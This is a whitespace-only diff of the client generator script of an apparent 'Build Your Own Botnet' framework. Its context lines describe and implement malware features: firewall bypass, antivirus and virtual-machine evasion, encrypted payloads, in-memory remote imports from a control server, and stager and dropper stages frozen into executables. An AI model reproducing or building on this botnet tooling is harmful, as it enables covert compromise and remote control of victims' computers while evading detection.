@@ -33,29 +33,29 @@ Generate clients with the following features:
         the server without downloading/installing them
 
     - In-Memory Execution Guidline
-        clients never write anything to the disk, 
+        clients never write anything to the disk,
         not even temporary files - zero IO system calls.
         remote imports allow code/scripts/modules to
-        be dynamically loaded into memory and directly 
+        be dynamically loaded into memory and directly
         imported into the currently running process
 
     - Add Your Own Scripts
         every python script, module, and package in the
-        `remote` directory is directl usable by every 
+        `remote` directory is directl usable by every
         client at all times while the server is running
 
     - Unlimited Modules Without Bloating File Size
         use remote imports to add unlimited features without
-        adding a single byte to the client's file size 
+        adding a single byte to the client's file size
 
     - Updatable
         client periodically checks the content available
-        for remote import from the server, and will 
+        for remote import from the server, and will
         dynamically update its in-memory resources
         if anything has been added/removed
 
     - Platform Independent
-        compatible with PyInstaller and package is authored 
+        compatible with PyInstaller and package is authored
         in Python, a platform agnostic language
 
     - Bypass Firewall
@@ -68,8 +68,8 @@ Generate clients with the following features:
         with names of known antivirus products
 
     - Prevent Analysis
-        main client payload encrypted with a random 
-        256-bit key and is only 
+        main client payload encrypted with a random
+        256-bit key and is only
 
     - Avoid Detection
         client will abort execution if a virtual machine
@@ -99,7 +99,7 @@ import core.generators as generators
 
 # globals
 colorama.init(autoreset=True)
-__banner = """ 
+__banner = """
 
 88                                  88
 88                                  88
@@ -115,13 +115,13 @@ __banner = """
 
 # main
 def main():
-    """ 
+    """
     Run the generator
 
     """
     util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
 
-    parser = argparse.ArgumentParser(prog='client.py', 
+    parser = argparse.ArgumentParser(prog='client.py',
                                     version='0.1.5',
                                     description="Generator (Build Your Own Botnet)")
 
@@ -136,7 +136,7 @@ def main():
                         help='server port number')
 
     parser.add_argument('modules',
-                        metavar='module',   
+                        metavar='module',
                         action='append',
                         nargs='*',
                         help='module(s) to remotely import at run-time')
@@ -188,11 +188,11 @@ def _modules(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
     util.display("\tAdding modules... ", color='reset', style='normal', end=',')
- 
+
     global __load__
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
- 
+
     modules = ['core/loader.py','core/util.py','core/security.py','core/payloads.py']
 
     if len(options.modules):
@@ -214,15 +214,15 @@ def _modules(options, **kwargs):
 def _imports(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Imports", color='reset', style='bright')
- 
+
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
- 
+
     util.display("\tAdding imports...", color='reset', style='normal', end=',')
- 
+
     global __load__
     globals()['__load__'] = threading.Event()
     globals()['__spin__'] = _spinner(__load__)
- 
+
     imports  = set()
 
     for module in kwargs['modules']:
@@ -247,11 +247,11 @@ def _imports(options, **kwargs):
             if 'win32' in item or '_winreg' in item:
                 imports.remove(item)
     return imports
-                 
+
 def _hidden(options, **kwargs):
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
- 
+
     hidden = set()
 
     for line in kwargs['imports']:
@@ -338,7 +338,7 @@ def _stager(options, **kwargs):
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
 
-    if options.encrypt: 
+    if options.encrypt:
         stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
     else:
         stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])
@@ -389,7 +389,7 @@ def _dropper(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Dropper", color='reset', style='bright')
     util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
-    
+
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
@@ -407,7 +407,7 @@ def _dropper(options, **kwargs):
         __spin__ = _spinner(__load__)
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
-        
+
     util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
     return name
 
